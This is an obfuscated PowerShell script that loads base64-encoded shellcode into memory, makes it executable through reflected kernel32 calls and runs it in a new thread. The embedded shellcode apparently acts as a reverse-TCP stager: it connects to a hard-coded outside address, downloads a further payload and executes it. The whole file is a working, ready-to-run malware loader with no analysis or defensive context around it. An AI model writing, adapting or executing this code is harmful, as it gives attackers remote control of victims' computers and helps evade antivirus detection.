function fu {
        Param ($pLZ, $tuL)
        $kzA = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $kzA.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($kzA.GetMethod('GetModuleHandle')).Invoke($null, @($pLZ)))), $tuL))
}

function qD {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $vr4,
                [Parameter(Position = 1)] [Type] $tb = [Void]
        )

        $o3XLZ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $o3XLZ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $vr4).SetImplementationFlags('Runtime, Managed')
        $o3XLZ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $tb, $vr4).SetImplementationFlags('Runtime, Managed')

        return $o3XLZ.CreateType()
}

[Byte[]]$ixMV8 = [System.Convert]::FromBase64String("/OiPAAAAYInlMdJki1Iwi1IMi1IUD7dKJjH/i3IoMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi0B4hcB0TAHQi1ggUAHTi0gYhcl0PEkx/4s0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpolJEDcWgCAB32ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO78LWiVmoAU//V")
[Uint32]$yL = 0
$mU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll VirtualAlloc), (qD @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $ixMV8.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($ixMV8, 0, $mU, $ixMV8.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll VirtualProtect), (qD @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($mU, [Uint32]$ixMV8.Length, 0x10, [Ref]$yL)) -eq $true) {
        $fxL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll CreateThread), (qD @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$mU,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fu kernel32.dll WaitForSingleObject), (qD @([IntPtr], [Int32]))).Invoke($fxL,0xffffffff) | Out-Null
}
